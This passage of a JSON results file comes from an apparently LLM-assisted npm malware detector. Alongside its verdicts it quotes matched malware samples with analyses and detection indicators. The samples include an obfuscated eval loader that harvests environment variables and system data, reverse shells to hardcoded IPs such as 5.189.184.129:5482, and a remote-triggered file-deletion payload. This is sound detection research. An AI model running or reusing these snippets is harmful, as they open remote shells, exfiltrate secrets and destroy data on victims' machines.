+                "code_behavior": "At runtime, the code receives remote commands over the internet, directly maps network input to vehicle control functions, and executes these commands on vehicle control systems, resulting in unauthorized remote manipulation of physical vehicle operations such as unlocking doors, starting the engine, or controlling steering and braking.",
+                "malice_analysis": {
+                  "why_suspicious": "The code enables remote execution of critical vehicle controls based on network input, without robust authentication or authorization, which can allow attackers to take physical control of the vehicle remotely.",
+                  "violated_expectations": "Normal vehicle software should strictly restrict remote access to control systems, requiring strong authentication, authorization, and encrypted channels. This code bypasses or weakens these controls, allowing arbitrary or weakly authenticated remote commands to be executed.",
+                  "similar_legitimate_use": "Remote start or lock/unlock features, but only when implemented with strong authentication, encrypted communication, and strict access controls.",
+                  "key_indicators": [
+                    "Remote command execution mapped to vehicle control functions",
+                    "Weak or missing authentication/authorization checks on network input",
+                    "Direct invocation of vehicle control APIs from internet-facing interfaces",
+                    "Absence of input validation or access control for remote commands"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (remote command execution via internet-connected component)",
+                  "file_location": "Vulnerable proprietary or third-party component (e.g., infotainment, ADAS, telematics)",
+                  "required_permissions": [
+                    "network",
+                    "vehicle control systems",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple Connected Car Software Components",
+                  "package_manager": "Various (proprietary, open-source, third-party)",
+                  "package_versions": "Multiple, including legacy and current versions (notably, some >10 years old)",
+                  "why_malicious": "The risk arises from insecure or outdated software components, vulnerable open-source libraries, and the potential for malicious or compromised code to be introduced via the software supply chain. The interconnected nature of vehicle systems and their internet connectivity create opportunities for attackers to remotely execute arbitrary commands, exfiltrate data, or even take physical control of vehicles."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker identifies a vulnerable or outdated software component in the vehicle's connected system (e.g., via internet-exposed interface or OTA update mechanism).",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Gaining initial access or information disclosure."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker exploits the vulnerability to gain remote access or escalate privileges within the vehicle's software environment.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ability to send arbitrary commands to vehicle systems."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker leverages insecure OTA update process to install persistent malicious code or further compromise vehicle systems.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Full compromise of vehicle control and/or data exfiltration."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Remote command execution on vehicle control systems from internet-facing interfaces without strong authentication",
+                    "OTA updates installed without cryptographic signature verification or with signature verification bypassed",
+                    "Use of outdated libraries with known critical CVEs (e.g., Heartbleed CVE-2014-0160, Dirty COW CVE-2016-5195, Spectre CVE-2017-5753/CVE-2017-5715)"
+                  ],
+                  "file_indicators": [
+                    "Presence of legacy or unpatched open-source components (e.g., OpenSSL <1.0.1g, Linux kernel <4.8.3) in firmware or system images",
+                    "OTA update logs or audit trails showing installation of unsigned or unverified packages",
+                    "Unusual or unauthorized modifications to vehicle control software binaries or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Unusual inbound connections to vehicle telematics or infotainment systems from external IPs",
+                    "Outbound connections to untrusted or unexpected domains or IP addresses during OTA updates",
+                    "Patterns of data exfiltration, such as large memory dumps or credential data sent externally during or after remote command execution"
+                  ],
+                  "how_to_detect": "Continuously monitor for remote command execution attempts on vehicle systems, enforce and audit cryptographic signature checks on all OTA updates, and regularly scan firmware and software components for outdated or vulnerable libraries using SBOMs and vulnerability databases. Analyze network traffic for suspicious inbound connections to vehicle systems and outbound connections to untrusted domains, especially during update windows or when vehicle controls are accessed remotely. Correlate file system changes and update logs to detect unauthorized software modifications."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43125617504119873,
+              "code_similarity": 0.470797061920166,
+              "behavior_similarity": 0.39171525835990906,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/sabertooth-usb/1.5.1/package/lib/examples/drive.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "drive_slice_1",
+          "code_snippet": "\"use strict\";\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst index_1 = require(\"../index\");\nconst sabertooth = new index_1.SabertoothUSB('/dev/ttyACM0');\nconst sourceVoltage = 12;\nlet value = -sourceVoltage;\nsetInterval(() => __awaiter(void 0, void 0, void 0, function* () {\n    try {\n        sabertooth.setMotor('*', value / sourceVoltage);\n        value = value >= sourceVoltage ? -sourceVoltage : value + 1;\n    }\n    catch (e) {\n        console.error(e);\n    }\n}), 2000);",
+          "is_malicious": false,
+          "malice_score": 0.49553425709406534,
+          "confidence": 0.2,
+          "behavior_summary": "At import-time, the code accesses a hardware device via the SabertoothUSB interface on the hardcoded path '/dev/ttyACM0' and repeatedly sends motor control commands using setMotor. It modifies motor speed values in a loop every 2 seconds, interacting with a device driver but does not perform network, file, or process operations. This behavior facilitates direct hardware control which could be leveraged for unauthorized device manipulation.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code interacts directly with hardware via the SabertoothUSB interface to control motor speeds in a loop. While this is sensitive and could be leveraged for unauthorized device manipulation, the code does not exhibit any of the key malicious behaviors seen in the known malware patterns, such as network communication for command-and-control, spawning shells, or unauthorized industrial device manipulation. The code lacks obfuscation, remote triggers, or attempts to exfiltrate data or escalate privileges. Its behavior is consistent with legitimate hardware control software rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_063579_snippet_3",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5131987929344177,
+              "code_similarity": 0.4573957324028015,
+              "behavior_similarity": 0.5690018534660339,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "setInterval(() => {\n  fetch('https://6514b3f1dc3282a6a3cd7125.mockapi.io/server/1').then(_0x231e3e => _0x231e3e.json()).then(_0x361fb2 => {\n    if (_0x361fb2.isAngry) {\n      angry();\n    }\n  })['catch'](_0x5d61c5 => {})[\"finally\"](_0x1c49c6 => {});\n}, 0xbb8);",
+                "code_behavior": "At runtime, the code periodically (every 3 seconds) polls a hardcoded remote server for a trigger value; if the server responds with isAngry=true, it executes the destructive angry() function, enabling remote-controlled data destruction via command-and-control.",
+                "malice_analysis": {
+                  "why_suspicious": "The code establishes a command-and-control channel by polling an external server for instructions, which is a common malware technique, and enables remote activation of destructive payloads.",
+                  "violated_expectations": "A utility package should not make unsolicited network requests or execute remote-controlled destructive actions based on external input.",
+                  "similar_legitimate_use": "Some legitimate software checks for updates or configuration from a server, but never for destructive triggers or to execute shell commands.",
+                  "key_indicators": [
+                    "Periodic polling of external server (6514b3f1dc3282a6a3cd7125.mockapi.io)",
+                    "Conditional execution of destructive payload based on remote response",
+                    "Obfuscated and hidden within unrelated functionality",
+                    "No user notification or consent for remote-controlled actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (periodic polling after package import, conditional on directory name and remote server response)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787787_snippet_1",
+              "source_package": "plutov-slack-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787787/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4879375100135803,
+              "code_similarity": 0.38317328691482544,
+              "behavior_similarity": 0.5927017331123352,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function node_payload() {\n  var require = global.require || global.process.mainModule.constructor._load;\n  if (!require) return;\n  var cmd = (global.process.platform.match(/^win/)) ? \"cmd\" : \"/bin/sh\";\n  var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []);\n  var client = this;\n  var counter = 0;\n  function StagerRepeat() {\n    client.socket = net.connect(1111, \"50.x.x.x\", function () {\n      client.socket.pipe(sh.stdin);\n      if (typeof util.pump === \"undefined\") {\n        sh.stdout.pipe(client.socket);\n        sh.stderr.pipe(client.socket);\n      } else {\n        util.pump(sh.stdout, client.socket);\n        util.pump(sh.stderr, client.socket);\n      }\n    });\n    socket.on(\"error\", function (error) {\n      counter++;\n      if (counter <= 10) {\n        setTimeout(function () {\n          StagerRepeat();\n        }, 5 * 1000);\n      } else process.exit();\n    });\n  }\n  StagerRepeat();\n}\nconsole.log(\"\");\nnode_payload();",
+                "code_behavior": "At import-time or runtime, the code spawns a system shell process and establishes a persistent TCP connection to a hardcoded remote server, piping shell input and output through the network socket, resulting in a reverse shell that enables remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically spawns a shell and connects to a hardcoded external IP and port, then pipes shell input/output over the network. This is a textbook reverse shell technique, commonly used by attackers to gain remote control of compromised systems.",
+                  "violated_expectations": "Legitimate npm packages should not spawn system shells or open outbound network connections to hardcoded IP addresses without explicit user action and clear documentation. Such behavior is highly abnormal and dangerous in general-purpose packages.",
+                  "similar_legitimate_use": "Remote administration tools or debugging utilities may use similar patterns, but only with explicit user consent, secure authentication, and transparent documentation. In this case, there is no user interaction or disclosure.",
+                  "key_indicators": [
+                    "Spawning a shell process (cmd or /bin/sh) via child_process.spawn",
+                    "Connecting to a hardcoded remote IP address (e.g., 50.x.x.x) and port (1111)",
+                    "Piping shell standard input/output to a network socket",
+                    "Retry logic for persistent connection attempts to the attacker's server",
+                    "Use of global.require or process.mainModule.constructor._load to evade static analysis"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "main module (e.g., index.js or main entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "plutov-slack-client",
+                  "package_manager": "npm",
+                  "package_versions": "all versions prior to removal",
+                  "why_malicious": "Contains code that, upon import or execution, establishes a reverse shell to a hardcoded remote attacker-controlled server, granting the attacker unauthorized remote access to the victim's machine for arbitrary command execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code executes automatically upon installation or import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "System compromise or data exfiltration depending on the package."
+                  },
+                  {
+                    "step": 3,
+                    "action": "For plutov-slack-client, nodetest199, nodetest1010: Establishes a reverse shell to the attacker's server, granting remote access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands on the victim's machine via the reverse shell."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For npmpubman: Collects all environment variables and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data for reconnaissance or further attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Spawning a shell process (e.g., /bin/sh or cmd.exe) and connecting to a hardcoded external IP/port at import-time or runtime",
+                    "Piping shell input/output streams to a network socket for remote command execution",
+                    "Accessing and serializing all environment variables from process.env",
+                    "Base64 encoding of environment data followed by HTTP POST to a hardcoded external server at import-time or runtime"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that spawns /bin/sh or cmd.exe using child_process.spawn",
+                    "Hardcoded IP addresses (e.g., 50.x.x.x) or hostnames (e.g., x.x.x.net) in source code",
+                    "Base64 encoding of environment variables in code",
+                    "HTTP POST requests to /log/ endpoint in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound TCP connections to uncommon ports (e.g., 1111) or suspicious hardcoded IP addresses",
+                    "HTTP POST requests to suspicious domains (e.g., x.x.x.net) or IPs with base64-encoded payloads in the body"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that spawn shell processes or open outbound network connections to hardcoded IP addresses or domains at install, import, or runtime. Flag packages that access process.env and transmit its contents externally, especially if the data is encoded or sent to hardcoded domains or endpoints such as /log/. Use static analysis to detect reverse shell patterns and dynamic analysis to observe unexpected network activity or environment variable exfiltration upon package installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113220_415389_snippet_3",
+              "source_package": "INCONTROLLER / PIPEDREAM ICS Malware Suite (Custom/Unknown (malware targeting ICS/SCADA devices, not distributed via public package managers))",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113220_415389/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48730701208114624,
+              "code_similarity": 0.34087586402893066,
+              "behavior_similarity": 0.6337381601333618,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode representing OMSHELL Omron PLC attack behavior\nconnect_to_omron_plc(target_ip)\nscan_device()\nread_servo_drive_parameters()\nwrite_servo_drive_parameters()",
+                "code_behavior": "At runtime, the code connects to Omron PLCs and servo drives, scans devices, reads and writes servo drive parameters, enabling unauthorized manipulation of industrial machinery operation.",
+                "malice_analysis": {
+                  "why_suspicious": "Unauthorized access and manipulation of servo drive parameters can cause physical damage or unsafe operation of industrial equipment, representing a direct threat to safety and process integrity.",
+                  "violated_expectations": "Normal operations do not involve unscheduled or unauthorized parameter changes on servo drives; such actions are strictly controlled and logged.",
+                  "similar_legitimate_use": "Legitimate engineering tasks may involve parameter changes, but only under strict controls, with proper authentication, and during scheduled maintenance.",
+                  "key_indicators": [
+                    "Unauthorized Omron PLC or servo drive access",
+                    "Unscheduled parameter manipulation on servo drives"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when executed on an engineering workstation or within an ICS network",
+                  "file_location": "malware binary (OMSHELL component)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "INCONTROLLER / PIPEDREAM ICS Malware Suite",
+                  "package_manager": "Custom/Unknown (malware targeting ICS/SCADA devices, not distributed via public package managers)",
+                  "package_versions": "N/A (modular malware suite, not versioned in the traditional sense)",
+                  "why_malicious": "The malware suite is specifically engineered to compromise, disrupt, and manipulate industrial control systems (ICS) and supervisory control and data acquisition (SCADA) devices. It enables attackers to enumerate, control, and sabotage critical infrastructure by exploiting device protocols, brute-forcing credentials, and leveraging known vulnerabilities in engineering workstations. The suite's modular tools provide full system access, lateral movement, and device manipulation capabilities, representing a severe and targeted threat to operational technology environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial compromise of engineering workstation, possibly via phishing or supply chain attack.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malware components on the workstation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Privilege escalation on engineering workstation using ASRock driver exploit.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full system access and ability to deploy ICS attack modules"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Network reconnaissance and enumeration of ICS/SCADA devices (OPC UA servers, PLCs).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Identification of targets for manipulation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Brute-force credentials and gain unauthorized access to ICS devices.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ability to read/write tag values and manipulate device state"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Manipulation of PLC memory, tag values, and servo drive parameters to disrupt or sabotage industrial processes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Disruption, degradation, or damage to ICS/SCADA operations (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Bulk enumeration of OPC UA tags and structure from engineering workstations",
+                    "Brute-force authentication attempts against OPC UA servers originating from non-standard sources",
+                    "Unauthorized Modbus protocol activity targeting PLCs outside of scheduled maintenance windows",
+                    "Unscheduled or unauthorized read/write operations on PLC memory or servo drive parameters",
+                    "Loading and exploitation of known vulnerable ASRock motherboard drivers for privilege escalation"
+                  ],
+                  "file_indicators": [
+                    "Presence of unknown or unsigned binaries on engineering workstations",
+                    "Unexpected driver files related to ASRock hardware in system directories",
+                    "Malware components named TAGRUN, CODECALL, OMSHELL, EVILSCHOLAR, BADOMEN, DUSTTUNNEL, MOUSEHOLE, LAZYCARGO"
+                  ],
+                  "network_indicators": [
+                    "Unusual OPC UA and Modbus network traffic originating from engineering workstations",
+                    "Connections to PLCs and OPC UA servers outside of scheduled maintenance or authorized engineering sessions",
+                    "Lateral movement within OT networks from compromised workstations"
+                  ],
+                  "how_to_detect": "Monitor engineering workstations and OT networks for unauthorized enumeration of OPC UA tags, brute-force authentication attempts, and unscheduled Modbus/Omron protocol activity. Detect loading of vulnerable ASRock drivers and privilege escalation attempts. Flag any binaries or processes matching known malware component names or exhibiting these behaviors. Correlate network activity with scheduled maintenance to identify suspicious access patterns. Implement endpoint and network monitoring to alert on these specific behavioral, file, and network indicators."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_786473_snippet_2",
+              "source_package": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786473/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4853154718875885,
+              "code_similarity": 0.40239018201828003,
+              "behavior_similarity": 0.568240761756897,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "(function(){\n  var net = require('net'),\n      cp = require('child_process'),\n      sh = cp.spawn('/bin/sh', []),\n      client = new net.Socket();\n  client.connect(5482, '5.189.184.129', function(){\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n  });\n})();",
+                "code_behavior": "At import-time, the code spawns a new shell process and establishes a TCP connection to a hardcoded remote IP address, piping shell input and output through the network socket to create a reverse shell, enabling remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a reverse shell to an external IP is a classic post-exploitation technique used by attackers to gain remote access and control over compromised systems.",
+                  "violated_expectations": "Normal npm packages should not spawn shell processes or initiate outbound network connections to arbitrary IP addresses, especially at import-time.",
+                  "similar_legitimate_use": "Penetration testing frameworks may use reverse shells, but such behavior is never appropriate in production dependencies or general-purpose packages.",
+                  "key_indicators": [
+                    "Spawning of /bin/sh via child_process.spawn",
+                    "Outbound TCP connection to hardcoded IP (5.189.184.129:5482)",
+                    "Piping shell stdin/stdout/stderr to a network socket",
+                    "Immediate execution at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "run.js (main entry point of malicious package)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
